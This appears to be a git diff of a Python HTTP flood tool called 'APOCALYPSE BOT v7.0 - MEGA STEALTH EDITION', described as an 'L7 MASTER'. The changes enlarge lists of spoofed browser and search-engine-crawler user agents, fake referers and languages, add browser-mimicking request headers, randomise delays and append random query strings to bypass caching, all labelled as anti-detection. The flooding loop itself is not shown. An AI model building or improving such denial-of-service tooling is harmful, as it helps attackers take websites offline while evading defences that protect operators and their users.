@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# APOCALYPSE BOT v7.0
+# APOCALYPSE BOT v7.0 - MEGA STEALTH EDITION
 # BY: 𝙳𝚎𝚊𝚝Nex
 
 import socket
@@ -26,60 +26,80 @@ RESET = '\033[0m'
 # Simple Banner
 BANNER = f"""
 {CYAN}┌─────────────────────────────────────────┐
-│  🤖 APOCALYPSE BOT v7.0                       
-│  BY:𝙳𝚎𝚊𝚝Nex                                    
-│  L7 MASTER                      
+│  🤖 APOCALYPSE BOT v7.0                   │
+│  BY: 𝙳𝚎𝚊𝚝Nex                              │
+│  🔗 MEGA STEALTH - 80+ UA & REF           │
 └─────────────────────────────────────────┘{RESET}
 """
 
-# ========== 100+ USER AGENTS ==========
+# ========== 80+ USER AGENTS ==========
 USER_AGENTS = [
-    # Windows Chrome (15)
+    # Windows Chrome
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36',
-    # Windows Firefox (8)
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/116.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36',
+    # Windows Firefox
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0',
-    # Windows Edge (6)
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0',
+    # Windows Edge
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/121.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0 Safari/537.36',
-    # Mac Chrome (8)
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/119.0.0.0 Safari/537.36',
+    # Mac Chrome
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
-    # Mac Safari (5)
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
+    # Mac Safari
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.1',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.0',
-    # Mac Firefox (5)
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/16.6',
+    # Mac Firefox
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
-    # Linux Chrome (8)
+    # Linux Chrome
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
-    # Linux Firefox (5)
+    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+    # Linux Firefox
     'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
     'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
-    # Android Chrome (10)
+    'Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0',
+    # Android Chrome
     'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
     'Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
     'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
     'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
     'Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
-    # iPhone Safari (8)
+    'Mozilla/5.0 (Linux; Android 14; Xiaomi 13) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; Oppo Find X5) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 14; Vivo X100) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
+    # Android Samsung Browser
+    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 SamsungBrowser/24.0 Chrome/121.0.0.0',
+    'Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 SamsungBrowser/23.0 Chrome/120.0.0.0',
+    # iPhone Safari
     'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
-    # iPhone Chrome (4)
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
+    # iPhone Chrome
     'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
-    # iPad (4)
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
+    # iPad
     'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
     'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
-    # Bot Crawlers (8) - anti detection
+    'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
+    # Bot Crawlers (Legit - Anti Detection)
     'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
     'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
     'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)',
@@ -88,49 +108,59 @@ USER_AGENTS = [
     'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
     'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
     'LinkedInBot/1.0 (compatible; Mozilla/5.0; Jakarta; +http://www.linkedin.com)',
+    'Mozilla/5.0 (compatible; Applebot/0.3; +http://www.apple.com/go/applebot)',
 ]
 
 # ========== 80+ REFERERS ==========
 REFERERS = [
-    # Search Engines (12)
+    # Search Engines
     'https://google.com', 'https://google.co.id', 'https://google.co.uk',
+    'https://google.co.jp', 'https://google.fr', 'https://google.de',
     'https://bing.com', 'https://yahoo.com', 'https://duckduckgo.com',
     'https://yandex.com', 'https://baidu.com', 'https://ecosia.org',
     'https://qwant.com', 'https://seznam.cz', 'https://naver.com',
-    # Social Media (15)
+    'https://daum.net', 'https://ask.com', 'https://aol.com',
+    # Social Media
     'https://facebook.com', 'https://m.facebook.com', 'https://instagram.com',
     'https://twitter.com', 'https://tiktok.com', 'https://linkedin.com',
     'https://pinterest.com', 'https://reddit.com', 'https://tumblr.com',
     'https://snapchat.com', 'https://whatsapp.com', 'https://telegram.org',
     'https://discord.com', 'https://twitch.tv', 'https://onlyfans.com',
-    # Video & Music (8)
+    'https://patreon.com', 'https://medium.com', 'https://quora.com',
+    'https://stackoverflow.com', 'https://github.com', 'https://gitlab.com',
+    # Video & Music
     'https://youtube.com', 'https://youtu.be', 'https://vimeo.com',
     'https://dailymotion.com', 'https://spotify.com', 'https://soundcloud.com',
-    'https://apple.com/music', 'https://deezer.com',
-    # E-commerce (10)
+    'https://apple.com/music', 'https://deezer.com', 'https://tidal.com',
+    'https://shazam.com', 'https://bandcamp.com',
+    # E-commerce
     'https://amazon.com', 'https://ebay.com', 'https://aliexpress.com',
     'https://tokopedia.com', 'https://shopee.co.id', 'https://lazada.co.id',
     'https://blibli.com', 'https://bukalapak.com', 'https://zalora.co.id',
-    'https://jd.id',
-    # News & Portal (8)
+    'https://jd.id', 'https://olx.co.id', 'https://carousell.com',
+    # News & Portal
     'https://cnn.com', 'https://bbc.com', 'https://nytimes.com',
     'https://kompas.com', 'https://detik.com', 'https://liputan6.com',
-    'https://tempo.co', 'https://republika.co.id',
-    # Tech & Developer (10)
-    'https://github.com', 'https://gitlab.com', 'https://stackoverflow.com',
-    'https://medium.com', 'https://dev.to', 'https://hackerrank.com',
-    'https://leetcode.com', 'https://w3schools.com', 'https://codecademy.com',
-    'https://freecodecamp.org',
-    # Edu & Government (7)
+    'https://tempo.co', 'https://republika.co.id', 'https://tribunnews.com',
+    'https://okezone.com', 'https://sindonews.com', 'https://merdeka.com',
+    # Tech & Developer
+    'https://github.com', 'https://gitlab.com', 'https://bitbucket.org',
+    'https://stackoverflow.com', 'https://medium.com', 'https://dev.to',
+    'https://hackerrank.com', 'https://leetcode.com', 'https://w3schools.com',
+    'https://codecademy.com', 'https://freecodecamp.org', 'https://codepen.io',
+    # Education & Government
     'https://wikipedia.org', 'https://kemdikbud.go.id', 'https://gov.id',
     'https://ui.ac.id', 'https://its.ac.id', 'https://ugm.ac.id',
-    'https://unair.ac.id',
+    'https://unair.ac.id', 'https://telkomuniversity.ac.id',
 ]
 
 ACCEPT_LANGUAGES = [
     'en-US,en;q=0.9', 'id-ID,id;q=0.9,en;q=0.8', 'en-GB,en;q=0.9',
     'id,en;q=0.9', 'ms-MY,ms;q=0.9,en;q=0.8', 'en-AU,en;q=0.9',
-    'zh-CN,zh;q=0.9,en;q=0.8', 'ja-JP,ja;q=0.9,en;q=0.8',
+    'en-CA,en;q=0.9', 'fr-FR,fr;q=0.9,en;q=0.8', 'de-DE,de;q=0.9,en;q=0.8',
+    'ja-JP,ja;q=0.9,en;q=0.8', 'zh-CN,zh;q=0.9,en;q=0.8', 'ko-KR,ko;q=0.9,en;q=0.8',
+    'ru-RU,ru;q=0.9,en;q=0.8', 'ar-SA,ar;q=0.9,en;q=0.8', 'pt-BR,pt;q=0.9,en;q=0.8',
+    'es-ES,es;q=0.9,en;q=0.8', 'it-IT,it;q=0.9,en;q=0.8', 'nl-NL,nl;q=0.9,en;q=0.8',
 ]
 
 def get_headers():
@@ -138,13 +168,20 @@ def get_headers():
         'User-Agent': random.choice(USER_AGENTS),
         'Referer': random.choice(REFERERS),
         'Accept-Language': random.choice(ACCEPT_LANGUAGES),
-        'Accept': '*/*',
-        'Cache-Control': 'no-cache',
-        'Connection': 'keep-alive',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Cache-Control': random.choice(['max-age=0', 'no-cache', 'no-store']),
+        'Connection': random.choice(['keep-alive', 'close']),
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
+        'Sec-Fetch-User': '?1',
+        'DNT': '1',
     }
 
 def random_delay():
-    return random.uniform(0.01, 0.05)
+    return random.uniform(0.01, 0.08)
 
 def random_query(url):
     param = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
